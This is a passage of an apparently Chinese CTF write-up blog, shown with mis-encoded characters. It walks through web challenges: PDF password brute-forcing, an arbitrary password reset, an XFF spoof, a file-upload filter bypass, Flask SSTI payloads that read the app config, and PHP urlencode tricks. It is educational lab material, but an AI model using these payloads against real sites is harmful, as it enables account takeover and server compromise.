<span class="keyword">in</span> ls:</span><br><span class="line">            print(i, <span class="string">&quot;\t&quot;</span>, result)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://220.249.52.133:30445/&quot;</span></span><br><span class="line">    pdfUrlList = []</span><br><span class="line">    findPDF(url)</span><br><span class="line">    print(pdfUrlList)</span><br><span class="line">    downloadFile(pdfUrlList)</span><br><span class="line">    pdfPathList = []</span><br><span class="line">    print(os.getcwd())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">&quot;.\\pdf\\&quot;</span>):</span><br><span class="line">        pdfPathList.append(<span class="string">&quot;.\\pdf\\&quot;</span> + i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pdfPathList:</span><br><span class="line">        Pdf2Text(i)</span><br><span class="line">        textFile = i[<span class="number">0</span>:-<span class="number">3</span>] + <span class="string">&quot;txt&quot;</span></span><br><span class="line">        findPassword(textFile)</span><br><span class="line">        print(<span class="string">&quot;Fileï¼š&quot;</span> + textFile)</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œè„šæœ¬ï¼Œå½“ç¢°åˆ°æ­£ç¡®çš„å¯†ç æ—¶è‡ªåŠ¨ç»ˆæ­¢</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395582.png" alt="1604316948660.png"></p>
<p>æ ¹æ®æ•£åˆ—å€¼å¾—çŸ¥æ˜¯fritzeè´¦æˆ·ï¼Œadmin.phpé¡µé¢è¾“å…¥å¾—åˆ°Flagï¼š</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395590.png" alt="1604316853076.png"></p>
<p>æ£€ç´¢30å¤šä¸ªPDFæ¥æ‰¾åˆ°å¯†ç ï¼Œåªèƒ½è¯´å¤§ä½¬ä»¬çš„è·¯å­çœŸçš„é‡~ğŸ˜Œ</p>
<h2 id="â­-bugï¼ˆä»»æ„ç”¨æˆ·å¯†ç é‡ç½®-XFFä¼ªé€ -æ–‡ä»¶ä¸Šä¼ ï¼‰"><a href="#â­-bugï¼ˆä»»æ„ç”¨æˆ·å¯†ç é‡ç½®-XFFä¼ªé€ -æ–‡ä»¶ä¸Šä¼ ï¼‰" class="headerlink" title="â­ bugï¼ˆä»»æ„ç”¨æˆ·å¯†ç é‡ç½®+XFFä¼ªé€ +æ–‡ä»¶ä¸Šä¼ ï¼‰"></a>â­ bugï¼ˆä»»æ„ç”¨æˆ·å¯†ç é‡ç½®+XFFä¼ªé€ +æ–‡ä»¶ä¸Šä¼ ï¼‰</h2><p>[redinfo title=â€é¢˜ç›®ä¿¡æ¯â€]æ¥æºï¼š RCTF-2015<br>éš¾åº¦ï¼š5æ˜Ÿ<br>è€ƒå¯Ÿï¼šé€»è¾‘æ¼æ´ï¼ˆä»»æ„ç”¨æˆ·å¯†ç é‡ç½®ï¼‰ã€å‚æ•°çŒœæµ‹ã€XFF IPä¼ªé€ ã€æ–‡ä»¶ä¸Šä¼ ç»•è¿‡ï¼ˆåç¼€è§£æã€MIMEã€PHPè„šæœ¬é™åˆ¶ï¼‰[/redinfo]</p>
<p>æ¯”è¾ƒå‘æ•£ï¼Œé¢˜ç›®ç¯å¢ƒæœ‰ä»¥ä¸‹åŠŸèƒ½ç‚¹ï¼šç™»é™†å‰ï¼ˆç™»å½•ã€æ³¨å†Œã€æ‰¾å›å¯†ç ï¼‰ï¼Œç™»å½•åï¼ˆç®¡ç†ã€ä¿®æ”¹å¯†ç ã€ä¸ªäººä¿¡æ¯ã€é€€å‡ºï¼‰ï¼Œç®¡ç†ç•Œé¢éœ€è¦adminæƒé™</p>
<p>æ³¨å†Œäº†ä¸€ä¸ªaaaçš„ç”¨æˆ·ï¼Œå¯¹ç™»å½•ã€æ³¨å†Œç­‰åŠŸèƒ½SQLæ³¨å…¥æ— æœï¼Œä½†æ˜¯åœ¨è¯·æ±‚å¤´çš„Cookieä¸­æœ‰ä¸€ä¸ªuserçš„å­—æ®µï¼Œå¯¹å…¶å€¼åšMD5è§£å¯†å‘ç°æ˜¯<strong>5:aaa</strong>ï¼Œå…¶ä¸­5æ˜¯aaade uidï¼Œå°è¯•å°†userå€¼æ”¹ä¸ºadminç›¸å…³çš„MD5æ•£åˆ—è¿›è¡Œè¶Šæƒï¼Œä¾ç„¶å¤±è´¥ã€‚</p>
<p>åœ¨æ‰¾å›å¯†ç å¤„å‘ç°ï¼Œå½“èº«ä»½éªŒè¯æˆåŠŸæ—¶ï¼Œé‡ç½®å¯†ç ä¼šåœ¨æ•°æ®åŒ…ä¸­åŒæ—¶ä¼ å…¥ç”¨æˆ·åå’Œæ–°å¯†ç ï¼Œæ‰€ä»¥æ€€ç–‘æ˜¯é‡ç½®å¯†ç ç›¸å…³çš„é€»è¾‘æ¼æ´ã€‚</p>
<p>å°†ç”¨æˆ·åæ”¹ä¸ºadminï¼ŒæˆåŠŸä¿®æ”¹adminçš„å¯†ç </p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605323687.png" alt="1604505334269.png"></p>
<p>ç™»å½•adminè´¦æˆ·æŸ¥çœ‹manageç•Œé¢ï¼Œæç¤ºIPä¸å…è®¸ï¼Œä¸ŠModHeaderï¼Œè€æœ‹å‹äº†ï¼Œå°†<strong>XFFä¿®æ”¹ä¸º127.0.0.1</strong>ï¼ŒæˆåŠŸç»•è¿‡IPæ ¡éªŒ</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605323694.png" alt="1604505774592.png"></p>
<p>æŸ¥çœ‹é¡µé¢æºç ï¼Œå‘ç°æç¤ºï¼š<code>&lt;!-- index.php?module=filemanage&amp;do=???--&gt;</code>ï¼Œéœ€è¦çŒœæµ‹doå‚æ•°ï¼Œæ˜¯å¯¹æ–‡ä»¶è¿›è¡Œç®¡ç†ï¼Œæ— éå°±æ˜¯ï¼š<strong>download</strong>ã€<strong>upload</strong>ã€<strong>delete</strong>ã€<strong>read</strong>ã€<strong>write</strong>ã€<strong>move</strong>ã€<strong>copy</strong>ï¼Œé€ä¸ªè¯•ä¸€ä¸‹å‘ç°æ­¤å¤„å‚æ•°æ˜¯uploadï¼Œè§¦å‘æ–‡ä»¶ä¸Šä¼ é¢˜ç›®</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605323701.png" alt="1604506183072.png"></p>
<p>ç»è¿‡ä¸æ–­ä¸Šä¼ å°è¯•ï¼Œå‘ç°ç³»ç»Ÿä¼šåšæ–‡ä»¶åç¼€æ£€æµ‹ã€MIMEæ£€æµ‹ã€PHPè„šæœ¬æ–‡ä»¶æ£€æµ‹ï¼ˆæ£€æµ‹&lt;?phpï¼‰ï¼Œä½†æ˜¯åˆéœ€è¦ä¸Šä¼ ä¸€ä¸ªphpæœ¨é©¬ï¼Œæ‰€ä»¥è¦åŒæ—¶ç»•è¿‡è¿™ä¸‰ä¸ªæ£€æµ‹ã€‚</p>
<p>å½“ä½¿ç”¨php5ç»•è¿‡åç¼€æ£€æµ‹ã€ä¿®æ”¹MIMEä¸ºimage/pngåï¼Œåœ¨phpè„šæœ¬æ–‡ä»¶ç›‘æµ‹å¤„ï¼Œå½“å­˜åœ¨<code>&lt;?php</code>æ—¶æç¤º<code>Something shows it is a php!</code>ï¼Œå½“åœ¨ï¼Ÿå’Œphpä¹‹é—´åŠ ä¸€ä¸ªç©ºæ ¼<code>&lt;? php</code>æ—¶åˆæç¤º<code>It is not a really php file</code></p>
<p>è¿™å°±è¡¨æ˜ï¼Œä¸èƒ½å¤Ÿä½¿ç”¨è¿™ç§phpè„šæœ¬çš„å†™æ³•ï¼Œåå°ä¼šæ£€æµ‹åˆ°ï¼Œé¢˜ç›®è€ƒå·®çš„æ˜¯phpè„šæœ¬çš„ç¬¬äºŒç§å†™æ³•ï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span>phpinfo()<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å°†payloadæ”¹ä¸ºç¬¬äºŒç§å†™æ³•ï¼Œå¾—åˆ°flag</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605323709.png" alt="1604506924276.png"></p>
<h2 id="â­-shrineï¼ˆSSTI-url-for-æ²™ç›’é€ƒé€¸ï¼‰"><a href="#â­-shrineï¼ˆSSTI-url-for-æ²™ç›’é€ƒé€¸ï¼‰" class="headerlink" title="â­ shrineï¼ˆSSTI+url_for()æ²™ç›’é€ƒé€¸ï¼‰"></a>â­ shrineï¼ˆSSTI+url_for()æ²™ç›’é€ƒé€¸ï¼‰</h2><p>é¢˜ç›®ç»™å‡ºäº†æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>shrineè·¯å¾„å¯æˆåŠŸè¿›è¡ŒSSTI</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332217.png" alt="1604051748466.png"></p>
<p>ç¬¬5è¡Œä½¿ç”¨<code>app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)</code>æ·»åŠ äº†ä¸€ä¸ªå…¨å±€é…ç½®ï¼ŒçŒœæµ‹å°±æ˜¯flag</p>
<p>ä½†æ˜¯åœ¨12è¡Œå®šä¹‰äº†<code>safe_jinja()</code>æ¥è¿›è¡Œå®‰å…¨æ ¡éªŒï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">	s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆåˆ é™¤()ï¼Œç„¶åå®šä¹‰é»‘åå•ï¼Œå°†configå’Œselfæ›¿æ¢ä¸ºNoneã€‚</p>
<p>è¿™é“é¢˜å¦‚æœæ²¡æœ‰è¿‡æ»¤çš„è¯ï¼Œå¯ä»¥ç›´æ¥**<code>&#123;&#123;config&#125;&#125;</code><strong>æˆ–</strong><code>&#123;&#123;self.__dict__&#125;&#125;</code>**ï¼Œç»æŸ¥é˜…ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰å…¶ä»–çš„å‡½æ•°æ–¹æ³•å¯ä»¥ä½¿ç”¨ï¼š</p>
<ul>
<li><p><strong>url_for()</strong><br><em>ä¸€èˆ¬æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªURLå°±å¯ä»¥æ‰§è¡Œåˆ°æŸä¸€ä¸ªå‡½æ•°ã€‚å¦‚æœåè¿‡æ¥ï¼Œæˆ‘ä»¬çŸ¥é“ä¸€ä¸ªå‡½æ•°ï¼Œæ€ä¹ˆå»è·å¾—è¿™ä¸ªURLå‘¢ï¼Ÿurl_forå‡½æ•°å°±å¯ä»¥å¸®æˆ‘ä»¬å®ç°è¿™ä¸ªåŠŸèƒ½ã€‚url_for()å‡½æ•°æ¥æ”¶ä¸¤ä¸ªåŠä»¥ä¸Šçš„å‚æ•°ï¼Œä»–æ¥æ”¶å‡½æ•°åä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ¥æ”¶å¯¹åº”URLè§„åˆ™çš„å‘½åå‚æ•°ï¼Œå¦‚æœè¿˜å‡ºç°å…¶ä»–çš„å‚æ•°ï¼Œåˆ™ä¼šæ·»åŠ åˆ°URLçš„åé¢ä½œä¸ºæŸ¥è¯¢å‚æ•°ã€‚</em></p>
</li>
<li><p><strong>get_flashed_messages()</strong><br><em>è¿”å›ä¹‹å‰åœ¨Flaskä¸­é€šè¿‡ flash() ä¼ å…¥çš„é—ªç°ä¿¡æ¯åˆ—è¡¨ã€‚æŠŠå­—ç¬¦ä¸²å¯¹è±¡è¡¨ç¤ºçš„æ¶ˆæ¯åŠ å…¥åˆ°ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œç„¶åé€šè¿‡è°ƒç”¨get_flashed_messages() æ–¹æ³•å–å‡º(é—ªç°ä¿¡æ¯åªèƒ½å–å‡ºä¸€æ¬¡ï¼Œå–å‡ºåé—ªç°ä¿¡æ¯ä¼šè¢«æ¸…ç©º)ã€‚</em></p>
</li>
</ul>
<p>å…·ä½“å¯å‚è€ƒï¼š<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/houyanhua1/article/details/85470175">https://blog.csdn.net/houyanhua1/article/details/85470175</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/shuibuzhaodeshiren/article/details/86819537">https://blog.csdn.net/shuibuzhaodeshiren/article/details/86819537</a></p>
<p>é¦–å…ˆåˆ©ç”¨url_foræŸ¥çœ‹å½“å‰æ‰€æœ‰å…¨å±€å˜é‡å­—å…¸ï¼Œå‘ç°äº†Flask</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332233.png" alt="1604053909419(1).png"></p>
<p>æ‰€ä»¥payloadå¦‚ä¸‹ï¼Œå³å¯å¾—åˆ°flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&quot;current_app&quot;</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332244.png" alt="1604054046849 (1).png"></p>
<p> get_flashed_messagesçš„payloadæ˜¯ä¸€æ ·çš„</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[&quot;current_app&quot;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>å‚è€ƒ</strong></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33020901/article/details/83036927">https://blog.csdn.net/qq_33020901/article/details/83036927</a></p>
<h2 id="â­-Web2ï¼ˆç¨‹åºé€†å‘ï¼‰"><a href="#â­-Web2ï¼ˆç¨‹åºé€†å‘ï¼‰" class="headerlink" title="â­ Web2ï¼ˆç¨‹åºé€†å‘ï¼‰"></a>â­ Web2ï¼ˆç¨‹åºé€†å‘ï¼‰</h2><p>å‡ºè‡ªNSCTFï¼Œé¢˜ç›®é¡µé¢ç»™å‡ºäº†ä¸€æ®µä»£ç ï¼Œå¦‚ä¸‹ï¼š</p>
<pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=strrev(<span class="variable">$str</span>);</span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;strlen(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable">$_c</span>=substr(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="variable">$__</span>=ord(<span class="variable">$_c</span>)+<span class="number">1</span>;</span><br><span class="line">        <span class="variable">$_c</span>=chr(<span class="variable">$__</span>);</span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode(<span class="variable">$_</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
</code></pre>
<p>è¦æ±‚æ˜¯é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flagï¼Œè¿›è¡Œ<strong>ä»£ç å®¡è®¡</strong>å§</p>
<p>ç¨‹åºå…¶å®å°±æ˜¯è‡ªå®šä¹‰ä¸€ä¸ªåŠ å¯†å‡½æ•°encode()ï¼ŒæŒ‰æ­¥éª¤åˆ†æç»“æœå¦‚ä¸‹ï¼š</p>
<pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=strrev(<span class="variable">$str</span>); <span class="comment">// å°†$stråè½¬ï¼ˆé€†åºï¼‰</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;strlen(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;  <span class="comment">// éå†</span></span><br><span class="line">        <span class="variable">$_c</span>=substr(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>); <span class="comment">// $_c ç­‰åŒäº $_o[$_0]</span></span><br><span class="line">        <span class="variable">$__</span>=ord(<span class="variable">$_c</span>)+<span class="number">1</span>;  <span class="comment">// $__ ç­‰äº $_cçš„asciiå€¼åŠ 1</span></span><br><span class="line">        <span class="variable">$_c</span>=chr(<span class="variable">$__</span>);  <span class="comment">// å†å°† $__ è½¬ä¸ºasciiå­—ç¬¦</span></span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   <span class="comment">// å­—ç¬¦ä¸²æ‹¼æ¥</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode(<span class="variable">$_</span>)));</span><br><span class="line">    <span class="comment">// å…ˆbase64ç¼–ç ã€å†é€†åºï¼Œå†è¿›è¡ŒROT13 ç¼–ç ï¼ˆæ‰€æœ‰å­—æ¯æŒ‰ç…§å­—æ¯è¡¨å‘å‰ç§»åŠ¨13ä½ï¼‰</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</code></pre>
<p>æœ‰å‡ ä¸ªå‡½æ•°æ‹¿å‡ºæ¥è®°å½•ä¸€ä¸‹ï¼š</p>
<ul>
<li>strrev(str)ï¼šå¯¹å­—ç¬¦ä¸²æ‰§è¡Œé€†åºæ“ä½œï¼Œå¦‚str=abcdï¼Œæ‰§è¡Œåä¸ºdcba</li>
<li>substr(str, a, n)ï¼šåœ¨å­—ç¬¦ä¸²strä¸­ï¼Œä»ä¸‹æ ‡ä¸ºaå¼€å§‹æˆªå–ï¼Œå…±æˆªå–nä¸ªå­—ç¬¦ï¼ˆä¸æŒ‡å®šnåˆ™æˆªå–åˆ°æœ«å°¾ï¼‰ã€‚é¢˜ç›®ä¸­nä¸º1ï¼Œaåˆæ˜¯ä¸æ–­é€’å¢ï¼Œæ‰€ä»¥å’Œå•Ša[i]è¿™ç§æ²¡æœ‰åŒºåˆ«</li>
<li>ord(s)ï¼šè¿”å›å­—ç¬¦sçš„asciiç </li>
<li>chr(n)ï¼šè¿”å›æ•°å­—nå¯¹åº”çš„assciiå­—ç¬¦</li>
<li>str_rot13(str)ï¼šå­—ç¬¦ä¸²strä¸­æ‰€æœ‰å­—æ¯æŒ‰ç…§å­—æ¯è¡¨å‘å‰ç§»åŠ¨13ä½ï¼ˆè¿˜åŸå°±æ˜¯å†æ‰§è¡Œä¸€æ¬¡è¯¥å‡½æ•°ï¼‰</li>
</ul>
<p>çŸ¥é“äº†åŠ å¯†æµç¨‹ï¼Œè§£å¯†å°±ä»åå¾€å‰ä¾æ¬¡åå‘æ“ä½œå°±OKäº†ï¼Œç›´æ¥ç”¨phpå†™å§ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$_o</span> = base64_decode(strrev(str_rot13(<span class="variable">$str</span>)));</span><br><span class="line">    <span class="variable">$_</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$_0</span> = <span class="number">0</span>; <span class="variable">$_0</span> &lt; strlen(<span class="variable">$_o</span>); <span class="variable">$_0</span>++)&#123;</span><br><span class="line">        <span class="variable">$_c</span> = substr(<span class="variable">$_o</span>, <span class="variable">$_0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$__</span> = ord(<span class="variable">$_c</span>) - <span class="number">1</span>;  <span class="comment">// è§£å¯†å‡1</span></span><br><span class="line">        <span class="variable">$_c</span> = chr(<span class="variable">$__</span>);</span><br><span class="line">        <span class="variable">$_</span> = <span class="variable">$_</span> . <span class="variable">$_c</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> strrev(<span class="variable">$_</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</code></pre>
<p>ä¼ å…¥å¯†æ–‡ï¼Œæ‰§è¡Œå³å¯å¾—åˆ°flag<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/12/1602477623.png" alt="1602774229504.png"></p>
<h2 id="â­-PHP2ï¼ˆphpsæºç æ³„æ¼-URLencodeç»•è¿‡ï¼‰"><a href="#â­-PHP2ï¼ˆphpsæºç æ³„æ¼-URLencodeç»•è¿‡ï¼‰" class="headerlink" title="â­ PHP2ï¼ˆphpsæºç æ³„æ¼+URLencodeç»•è¿‡ï¼‰"></a>â­ PHP2ï¼ˆphpsæºç æ³„æ¼+URLencodeç»•è¿‡ï¼‰</h2><p>é¢˜ç›®é¦–é¡µï¼š</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331731.png" alt="1602926244643.png"></p>
<p>å°è¯•ç›´æ¥åœ¨urlåè¾¹åŠ id=1â€¦â€¦æ¥çŒœæµ‹ï¼Œä½†æ˜¯æ— æœã€‚ç»å¸ˆå‚…ä»¬çš„åšæ–‡æç¤ºï¼Œå¾—çŸ¥å¯»åœ¨index.phpæ–‡ä»¶ï¼Œä½†æ˜¯è®¿é—®è¯¥æ–‡ä»¶æ²¡æœ‰ååº”ã€‚</p>
<p>OKï¼Œå°è¯•è®¿é—®index.phpsï¼ˆ.phpsåç¼€ä¸ºphpæ–‡ä»¶çš„æºç æ–‡ä»¶ï¼Œç”¨äºåœ¨ç½‘é¡µæŸ¥çœ‹phpæºç ï¼Œå› ä¸ºphpä¼šè¢«è§£ææ‰§è¡Œï¼‰ï¼Œå¾—åˆ°é¡µé¢æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>è¿›è¡Œç®€å•çš„å®¡è®¡</strong></p>
<p>GETæ–¹å¼ä¼ å…¥idå‚æ•°ï¼Œå¯¹idæœ‰ä¸¤ä¸ªifåˆ¤æ–­è¯­å¥ï¼š</p>
<ul>
<li>ç¬¬ä¸€ä¸ªï¼šå¼ºç­‰äºåˆ¤æ–­idæ˜¯å¦ä¸ºadminï¼Œè‹¥æ˜¯åˆ™ç»ˆæ­¢ç¨‹åº</li>
<li>ç¬¬äºŒä¸ªï¼šå¼±ç­‰äºåˆ¤æ–­idæ˜¯å¦ä¸ºadminï¼Œè‹¥æ˜¯åˆ™è¾“å‡ºflag</li>
</ul>
